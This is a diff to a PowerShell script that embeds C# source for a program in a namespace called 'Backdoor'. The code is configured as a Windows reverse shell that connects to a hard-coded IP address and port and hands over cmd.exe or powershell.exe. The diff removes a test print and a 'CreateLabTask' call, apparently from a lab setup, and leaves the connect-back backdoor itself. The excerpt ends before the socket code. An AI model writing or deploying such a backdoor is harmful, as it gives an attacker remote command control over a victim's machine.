@@ -1,4 +1,5 @@
 $cs = @"
+using System;
 using System.Text;
 using System.Net.Sockets;
 using System.Diagnostics;
@@ -7,25 +8,15 @@ using System.IO;
 namespace Backdoor
 {
 
-    
-
     public class Program
     {
-
-
-
         public static void Main()
         {
-            
-            Console.WriteLine("testing ...");
-            CreateLabTask();
- 
             string IpAddress = "172.25.206.179";
             Int32 Port = 9002;
             string CommandType = "cmd.exe"; // or "powershell.exe"
             String CommandPrompt = String.Empty;
             String Command;
-
             // Windows command prompt reverse shell
             if (CommandType == "cmd.exe")
             {
